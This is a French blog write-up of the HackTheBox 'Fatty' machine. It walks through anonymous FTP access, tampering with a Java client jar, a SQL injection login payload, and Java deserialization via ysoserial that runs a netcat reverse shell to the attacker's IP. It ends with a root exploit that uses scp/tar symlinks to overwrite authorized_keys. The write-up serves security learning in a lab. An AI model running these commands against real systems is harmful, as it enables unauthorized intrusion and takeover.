# HackTheBox - Fatty Write-Up




Durant le confinement, j'étais particulièrement actif sur HackTheBox. Ayant fait toutes les boxs que je jugeait "à ma portée" à un moment je m'étais lancé dans la quête (qui me paraissait impossible) d'une box notée _Insane_ !

Ainsi j'ai réussi __Fatty__ non sans difficulté. J'ai trouvé l'expérience assez intéréssante pour en faire un Write-Up que vous pouvez lire juste en dessous !

# Trouver un point d'entrée



```bash
sudo nmap -p 0-10000 -T5 -Pn -O -sV 10.10.10.174
	Nmap scan report for 10.10.10.174
	Host is up (0.039s latency).
	Not shown: 9996 closed ports
	PORT     STATE SERVICE            VERSION
	21/tcp   open  ftp                vsftpd 2.0.8 or later
	22/tcp   open  ssh                OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
	1337/tcp open  ssl/waste?
	1338/tcp open  ssl/wmc-log-svc?
	1339/tcp open  ssl/kjtsiteserver?
	3 services unrecognized despite returning data. If you know the service/version, please 	submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
	==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
	SF-Port1337-TCP:V=7.80%T=SSL%I=7%D=4/4%Time=5E88607F%P=x86_64-unknown-linu
	SF:x-gnu%r(NULL,80,"\xe4\xdb\xb8\xe4_\x13\x96T\t\xf3r\xa7m\xc8h\x87\xc8\xf
	<REDACTED>
	==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
	SF-Port1338-TCP:V=7.80%T=SSL%I=7%D=4/4%Time=5E88607F%P=x86_64-unknown-linu
	SF:x-gnu%r(NULL,80,"C\xec\"r\xfd\x89}\|\x1d\xddW\x1b\xf8ux\xf6\x15B\xf4\x9
	<REDACTED>
	==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
	SF-Port1339-TCP:V=7.80%T=SSL%I=7%D=4/4%Time=5E88607F%P=x86_64-unknown-linu
	SF:x-gnu%r(NULL,80,"\"\.\x0b\xb1\xcfd\x1a\xc3\x9c\xce\0\xd7\x982\xac\x99\x
	<REDACTED>
	Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A
	or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.12 (94%), Linux 3.13 (94%), Linux
	3.16 	(94%), Linux 3.18 (94%), Linux 3.8 - 3.11 (94%), Linux 4.4 (94%)
	No exact OS matches for host (test conditions non-ideal).
	Network Distance: 2 hops
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On peut voir :

- 1 service FTP (21)
- 1 service SSH (22)
- 3 services inconnus (1337,1338,1339)

## Le FTP

Dans un premier temps, l'option la plus logique est de tester une connexion anonyme au FTP.

![Connexion FTP en anonyme](/img/fatty_anonymous_ftp.png)

On a en effet un accès et quelques fichiers potentiellement intéréssants

- 3 fichiers textes
- 1 fichier executable jar

On s'empresse de récupérer tous ces fichiers puis on lit les notes.

<u>Note 1</u>

> Dear members, 
>
> because of some security issues we moved the port of our fatty java server from 8000 to the hidden and undocumented port 1337. 
> Furthermore, we created two new instances of the server on port 1338 and 1339. They offer exactly the same server and it would be nice
> if you use different servers from day to day to balance the server load. 
>
> We were too lazy to fix the default port in the '.jar' file, but since you are all senior java developers you should be capable of 
> doing it yourself ;)
>
> Best regards,
> qtc

<u>Note 2</u>

> Dear members, 
>
> we are currently experimenting with new java layouts. The new client uses a static layout. If your
> are using a tiling window manager or only have a limited screen size, try to resize the client window
> until you see the login from.
>
> Furthermore, for compatibility reasons we still rely on Java 8. Since our company workstations ship Java 11
> per default, you may need to install it manually.
>
> Best regards, 
> qtc

<u>Note 3</u>

> Dear members, 
>
> We had to remove all other user accounts because of some seucrity issues.
> Until we have fixed these issues, you can use my account:
>
> User: qtc
> Pass: clarabibi
>
> Best regards,
> qtc

Bien... La suite se passe donc sur le client jar.

# Le client jar

La première chose à faire c'est d'essayer d'executer le client normalement. Pour cela, rien de plus simple !

```bash
java -jar fatty-client.jar
```

![Page de login du client jar](/img/fatty_client_login.png)

On arrive sur une page de login, on test les identifiants donnés dans la 3ème note ( qtc / clarabibi ) et... Ça ne fonctionne pas. On obient un *Connection Error !*

## Réussir à se connecter

Si on se réfère à la première note : le port du serveur à changé, il est passé de 8000 à 1337 (et 1338, 1339 sans doute pour éviter les problèmes s'il y a trop de joueurs à la fois). Il faut donc trouver un moyen d'arranger tout ça.

On a besoin d'un peu plus d'informations. On va donc regarder dans le jar.

Basiquement, les jar ne sont que des archives de projet java.

```bash
file fatty-client.jar
	fatty-client.jar: Zip archive data, at least v2.0 to extract
```

Donc on va juste decompresser l'archive et regarder son contenu.

```bash
mkdir jar_content
cd jar_content
unzip ../fatty-client.jar
```

On y trouve un fichier **beans.xml**, celui-ci sera utilisé par Spring pour la construction d'objets. Ce fichier contient dans notre cas les informations de connexion au serveur :

```xml
<bean id="connectionContext" class = "htb.fatty.shared.connection.ConnectionContext">
   <constructor-arg index="0" value = "server.fatty.htb"/>
   <constructor-arg index="1" value = "8000"/>
</bean>
```

Je vais donc tout simplement les modifier pour qu'ils collent au serveur auquel je veux me connecter.

```xml
<bean id="connectionContext" class = "htb.fatty.shared.connection.ConnectionContext">
   <constructor-arg index="0" value = "10.10.10.174"/>
   <constructor-arg index="1" value = "1337"/>
</bean>
```

Ensuite, je n'ai plus qu'à recréer l'archive et à l'executer

```bash
zip -r ../modified-client.jar *
cd ..
java -jar modifier-client.jar
```

On retente la connexion avec les identifiants trouvés plus tôt et... On obtient une erreur.

> Exception in thread "AWT-EventQueue-0" org.springframework.beans.factory.BeanDefinitionStoreException: Unexpected exception parsing XML document from class path resource [beans.xml]; nested exception is java.lang.SecurityException: SHA-256 digest error for beans.xml

En réalité, ce n'est pas très grave. Le jar vérifie juste son intégrité via les signatures de fichiers et puisqu'on a modifié **beans.xml**, sa signature a changé. On va donc supprimer les fichiers permettant cette vérification.

```bash
zip -d modified-client.jar 'META-INF/*.SF' 'META-INF/*.RSA' 'META-INF/*SF'
```

On relance le jar, et cette fois la connexion fonctionne \o/ 



## Obtenir le code du serveur

Une fois connecté au serveur via le client, on a plusieurs fonctionnalités qui s'offrent à nous :

- *Whoami* - Pour avoir notre login et notre role (dans notre cas **qtc** et **user**)
- *Connection Test* - Pour tester la connexion avec le serveur
- *File Browser* - Pour sélectionner un dossier et pouvoir ensuite lire les fichiers qu'il contient

Ainsi que des fonctionnalités "grisées", sans doute accessible uniquement aux admins :

- *ChangePassword*
- *Uname*
- *Users*
- *Netstat*
- *IpConfig*

Pour commencer, on essaie de lire un fichier du serveur. On sait qu'il s'agit d'un Linux, on va donc tenter un *Path Traversal* via le *File Browser* pour lire le fichier */etc/passwd*.

![Path Traversal fail](/img/fatty_traversal_fail.png)

Visiblement, ça ne fonctionne pas, des caractères sont supprimés... Même en essayant de "bypass" ce nettoyage, impossible d'effectuer un *Path Traversal*.

Il faudrait avoir accès au code du client afin de comprendre comment il fonctionne. Et un outil existe pour décompiler du java : **jd-gui** !

On va tout simplement utiliser jd-gui pour récupérer l'intégralité des fichiers sources du projet. Pour cela on ouvre le projet (le modifié afin de toujours avoir le beans.xml voulu).

```bash
jd-gui modified-client.jar
```

Puis on sauvegarde les sources (*File > Save All Sources*).

On obtient alors un magnifique zip que l'on va décompresser.

```bash
mkdir client_sources
cd client_sources
unzip ../modified-client_sources.zip
```

Le dossier *org* contient apparemment des librairies importées. On va donc se concentrer sur le dossier *htb/fatty* qui a l'air de contenir du code propre à notre client. On va donc dans ce dossier et on recherche les fonctions qui nous intéressent. 

Dans notre cas on veut voir comment le *File Browser* fonctionne, on va donc faire une recherche par rapport à certains mots clefs. Par exemple le mot clef **configs** qui correspond à l'un des dossiers que l'on peut explorer.

```bash
grep -lR configs
	client/gui/ClientGuiTest.java
```

On fouille un peu le code java et on retrouve très vite la partie qui nous intéresse : Comment est configuré le dossier avec le *File Browser*.

![Code configuration dossier configs dans le File Browser](/img/fatty_filebrowser_code.png)

Sachant que toutes les options de *File Browser* nous emmènent dans */opt/fatty/files/\<OPTION CHOISIE>* on va essayer de modifier les strings *configs* de cette fonction pas *..* voir si on peut accéder à */opt/fatty*. 

On retourne dans la racine des sources (ici *client_sources*) et on compile tout ça.

```bash
cd ../..
shopt -s globstar #Pour faciliter la compilation juste après
javac **/*.java
```

Ici on a une erreur avec la compilation de spring ! Il suffit de récupérer le contenu déjà compilé que l'on a décompressé tout à l'heure.

```bash
rm -rf org/
cp -r ../jar_content/org/ .
javac **/*.java
zip -r ../modified-client.jar *
```

On relance le client, se connecte et va dans *File Browser > Configs* et là... Le contenu affiché diffère de la dernière fois.

![Contenu /opt/fatty](/img/fatty_opt_fatty_content.png)

Visiblement *logs*, *tar* et *files* sont des dossiers. On va alors lire *start.sh*.

![Contenu start.sh](/img/fatty_start_sh_content.png)

Apparemment, nous sommes dans un docker. On va malgré tout continuer et essayer de récupérer *fatty-server.jar*.

On se frotte à un problème : Le client ne nous permet que d'afficher les fichiers... Il faut donc trouver un moyen de télécharger ce fichier. En réfléchissant, j'ai décider d'utiliser une méthode "sale" mais efficace : écrire le retour du *Open* directement dans un fichier.

Il faut donc modifier le code (encore).

Donc là encore il faut trouver le moment de reception du contenu des fichiers lus. On va se baser sur le *Open* dans le GUI. On trouve le nom *openFileButton* auquel est accroché une action et pour obtenir la réponse cette action fait **this.invoker.open()**.

Malheureusement, cela nous sort un String, je veux être sur de ne pas avoir de problème, je veux le byte-string correspondant. On va remonter cette fonction *open*.

Pour ça, on voit que invoker vient d'un autre fichier java : **htb/fatty/client/methods/Invoker.java** et on retrouve le code de la fonction *open*.

![Code de la fonction open](/img/fatty_open_code.png)

On voit bien le moment où il récupère le contenu de la réponse. Ici il fait un **getContentAsString()**. On va plutôt utiliser la méthode **getContent()** qui va récupérer un objet de type **byte[]** et le rediriger vers un fichier.

![Code modifié de open](/img/fatty_modified_open.png)

On a donc rajouté les lignes suivantes

```java
try (FileOutputStream fos = new FileOutputStream("/tmp/fatty-server.jar")) {
	fos.write(this.response.getContent());			
}
```

En oubliant pas d'importer les bibliothèques java nécessaires

```java
import java.io.File;
import java.io.FileOutputStream;
```



Donc à chaque fois que l'on va utiliser *open*, le contenu de la réponse sera écrit dans ce fichier.

On recompile, recréé le jar et on va utiliser la fonction *open* sur *fatty-server.jar*. Puis on regarde si le fichier a bien été créé.

```bash
file /tmp/fatty-server.jar
	/tmp/fatty-server.jar: Zip archive data, at least v1.0 to extract
```

Super ! On a plus qu'à le récupérer et surtout... Récupérer ses sources, là encore avec **jd-gui**.

Maintenant la question est... Qu'est-ce qu'on en fait ?

On a vu qu'il y avait des options "grisée", on en a déduit qu'elles n'étaient pas accessible au role *user*. On va donc essayer d'obtenir un role *admin*. On part donc en analyse statique du code du serveur.

## Obtenir plus de droits

En regardant rapidement le code du serveur, on voit qu'il y a un code pour gérer la base de données (*htb/fatty/server/databaseF/attyDbSession.java*) et dans ce code se trouve une requête SQL.

![Code de connexion utilisateur sur le serveur](/img/fatty_server_logging.png)

Et surtout, fait intéressant, la requête est vulnérable aux injections ! Et elle récupère 5 données que l'on peut facilement comprendre :

- id : l'ID de l'utilisateur (sans doute une clef primaire de la table)
- username : le nom de l'utilisateur (jusque là on utilisait *qtc*)
- email : le mail de l'utilisateur
- password : le mot de passe de l'utilisateur (jusque là *clarabibi*)
- role : le rôle de l'utilisateur (jusque là *user*)

Il faut donc forger une requête avec le même username, le même hash de mot de passe mais un rôle **admin**.

On peut voir que pour la vérification du mot de passe, celle-ci se fait en vérifiant le mot de passe de l'utilisateur requêté et celui qui a été envoyé pas le client. On va donc faire une modification dans le client pour envoyer un "hash" connu.

Et pour ça, ça se passe dans *htb/fatty/shared/resources/User.java* avec la fonction *setPassword()*

![Code setPassword() du client](/img/fatty_setPassword.png)

On va tout simplement modifier la dernière ligne de ce code par :

```java
this.password = "ABCD";
```



On compile, recréé le jar et pour se connecter on met en guise de username :

> pouet' UNION SELECT 1, 'qtc', 'qtc@mail.com', 'ABCD', 'admin

Et nous avons une connexion en tant que qtc avec un rôle admin !

## Obtenir un accès sur le serveur

On a donc maintenant accès à des commandes "admin". Il y a sans doute faire quelque chose à faire avec.

Dans la liste on a :

- *Uname* - Effectue un *uname* sur le serveur
- *Users*  - Liste apparemment le contenu de */home*
- *Netstat* - Effectue un netstat
- *IpConfig* - Effectue un ipconfig
- *ChangePassword* - Permet de changer le mot de passe, mais n'est pas implémenté encore

Après vérification dans le code serveur,  on peut vori qu'on a tout bon pour les 4 premiers et il n'y a aucune injection de commande possible. L'idée est donc de se concentrer sur le *ChangePassword* qui pour le coup est un peu plus particulier.

On regarde donc le code au niveau du serveur.

![Code ChangePassword sur le serveur](/img/fatty_changePW.png)

Et on voit une désérialisation vers un object *User*. On cherche un peu d'information sur les désérialisation en java et on tombe vite sur le github [Java Deserialization Cheat Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet). Et il parle de **CommonsCollections**, une bibliothèque Java qui est justement utilisée pas notre client et notre serveur.

On regarde un peu plus en détail notre code et on voit que cet objet sérialisé vient d'un Base64 qui a été envoyé par le client. On va donc voir au niveau du code client, dans le fichier *htb/fatty/client/methods/Invoker.java* (Fonction *changePW()* là aussi).

![Envoi de l'objet sérialisé dans le code client](/img/fatty_serialized_user.png)

Dans un premier temps, on va faire en sorte qu'il soit "implémenté" (C'est à dire que cette fonction soit appelée). Pour ça, ça se passe dans le code du GUI, ligne 560.

![Listener du bouton de changement de mot de passe](/img/fatty_pwChangeButton.png)

On voit que lorsque l'on appuie sur le bouton, le message "*Not implemented yet.*" est affiché dans tous les cas. On va supprimer l'affichage de ce message et copier le fonctionnement des autre boutons pour appeler *changePW()*. On va donc mettre ce code (avec des valeurs "poubelles" dans l'appel de la fonction puisqu'on ne s'en servira pas).

```java
try {
    ClientGuiTest.this.invoker.changePW("qtc","pouetpouet");
} catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
    JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
}
catch (IOException e2) {
    JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
}
textPane.setText("Payload launched"); /* Pour être sûr que ça appelle la fonction
```



Et maintenant, on modifie le code de *changePW()*. Dans un premier temps il nous faut une payload.

Pour générer la payload, on va utiliser [ysoserial](https://github.com/frohoff/ysoserial), d'après le fichier *META-INF/maven/fatty-server/fatty-server/pom.xml* le serveur utilise la version 3.1 de *commons-collections*. Il y a donc 5 payloads possibles via *ysoserial*, on les essayer une par une. 

```bash
java -jar ysoserial.jar CommonsCollectionsX 'nc 10.10.14.58 51337 -e /bin/sh' | base64 -w0
```

Ici, X est à remplacer par le numéro de payload. On obtient un base64 que l'on va utiliser dans notre code. Pour cela il n'y a qu'à modifier la ligne 

```java
this.action.addArgument(new String(serializedUser64));
```

par

```java
String b64payload = new String(/* AJOUTER LA PAYLOAD OBTENUE */);
this.action.addArgument(b46payload);
```

Comme d'habitude on passe par les étapes compilations & création du jar puis on ouvre un listener sur notre machine.

```bash
nc -nlvp 51337
```

On lance le client, se connecte en admin, va dans *Change Password* puis sans même remplir le formulaire on clique sur *Change*.

Et là, avec la payload *CommonsCollections5* on obtient un reverse shell sur la machine.

![Reverse shell sur Fatty](/img/fatty_reverse_shell.png)

Le fichier *user.txt* n'a pas les droits de lecture (sans doute pour obliger les joueurs à avoir un shell pour le lire), on lui donne et le lit.

```bash
chmod +r user.txt
cat user.txt
	7fab2c31fc7173a86872db45ae922073
```

# Devenir root

## Obtenir un meilleur shell

Avant de devenir root, une première chose à faire est d'avoir un shell digne de ce nom. Problème : Comme on l'a vu on est dans un docker, il n'y a donc quasiment aucun binaire.

Celui dont nous avons le plus besoin est **python**. Pour ça, un dépot git existe : [static-binaries](https://github.com/andrew-d/static-binaries) !

On va donc le récupérer via un serveur HTTP fait en python sur ma machine.

```bash
cd /tmp
wget 10.10.14.58:9000/python2.7 2>&1 #Le 2>&1 permet d'avoir le retour du wget
wget 10.10.14.58:9000/python2.7.zip 2>&1
chmod +x python2.7
```

Puis on effectue notre suite de commande habituelle pour avoir un beau shell intéractif

```bash
PYTHONPATH=/tmp/python2.7.zip ./python2.7 -c 'import pty;pty.spawn("/bin/sh")'
	<Ctrl+Z>

stty -a | head -n1 #Je lis les valeurs rows & columns
stty raw -echo
fg #Il faut faire plusieures fois entrée
stty rows X columns Y #Avec X et Y les valeurs lues plus haut
export TERM=xterm-256color	
```



## Trouver le point d'entrée

Maintenant, il faut trouver comment accéder au root de la machine sachant que nous sommes dans un docker.

J'utilise donc [pspy](https://github.com/DominicBreuker/pspy) pour voir ce qu'il se passe (ici encore récupéré via wget). Et on voit chaque minute une commande est executée par notre utilisateur.

```bash
ash -c scp -f /opt/fatty/tar/logs.tar 
```

L'option **-f** de scp est non-documentée. En réalité c'est un serveur distant qui demande à notre docker de lui envoyer le fichier */opt/fatty/tar/logs.tar*. A partir de là on peut établir une hypothèse sur ce qui est executé sur le serveur que l'on veut atteindre.

```bash
scp qtc@<IP DOCKER>:/opt/fatty/tar/logs.tar .
tar -xvf logs.tar
```

On peut ensuite supposer que ces commandes seront executées en tant que root.

Si ces hypothèses savèrent vraies, alors on peut facilement obtenir le shell root.

## Obtenir un shell root

Pour obtenir un shell root en exploitant *scp* et *tar*, il faut utiliser un lien symbolique.

En effet, une archive peut contenir un lien symbolique. En décompressant celle-ci le lien symbolique est gardé intacte.  Par exemple :

- Je créé un lien symbolique 

  ```bash
  ln -s /tmp/fichier_test symlink
  ```

- Je le met dans une archive

  ```bash
  tar -cvf archive.tar symlink
  ```

- J'envoie ce tar sur un autre machine

- Je décompresse le tar

  ```bash
  tar -xvf archive.tar
  ```

- J'écris dans le fichier symlink

  ```bash
  echo "Test test" > symlink
  ```

- Le fichier */tmp/fichier_test* existe et contient notre test

  ```bash
  cat /etc/fichier_test
  	Test test
  ```

Dans notre cas, nous que la décompression sur le serveur cible transforme *logs.tar* en lien symbolique vers */root/.ssh/authorized_keys* afin de pouvoir, lors d'un second scp, écrire sur celui-ci.

Donc on fait comme suit :

```bash
ln -s /root/.ssh/authorized_keys logs.tar
tar -cvf archive.tar logs.tar
cp archive.tar /opt/fatty/tar/logs.tar
```

On attend ensuite un scp (une minute, on peut voir son déclenchement avec *pspy*). Puis on remplace notre lien symbolique par un fichier contenant notre clef publique SSH

```bash
echo "ssh-rsa AAAAB <REDACTED> vHXw== driikolu@Terweb" > id_rsa.pub
cp id_rsa.pub /opt/fatty/tar/logs.tar
```

Là encore on attend le scp puis sur notre machine on fait

```bash
ssh root@10.10.10.174
```

Et nous avons un accès SSH direct en root. Il ne nous reste plus qu'à lire le *root.txt*.

```bash
cat root.txt 
	ee982fa19b413415391ed4a17b2bd9c7
```

# Conclusion

J'ai trouvé cette box très intéréssante, c'était ma première de niveau "Insane" et je pense que celui-ci n'est pas volé. J'ai appris quelques trucs en la faisant (notamment sur CommonsCollections) et ça m'a permis de me remettre légèrement au Java.

Par contre, si ça n'avait pas été dans un contexte CTF/HackTheBox je pense que je n'aurais jamais trouvé la vulnérabilité de désérialisation. Dans ce genre de contexte quasiment tout a un sens et il existait forcément un chemin vers un accès serveur. En cas réel j'aurais probablement mis ça de côté.

Même si les clients lourds se font de plus en plus rare dans l'informatique, j'ai trouvé ça réaliste à ce niveau avec peut-être un bémol sur la *privesc* qui restait sympathique.





---

> Auteur: [Driikolu](https://x.com/driikolu)  
> URL: https://driikolu.fr/posts/fatty-wu/  

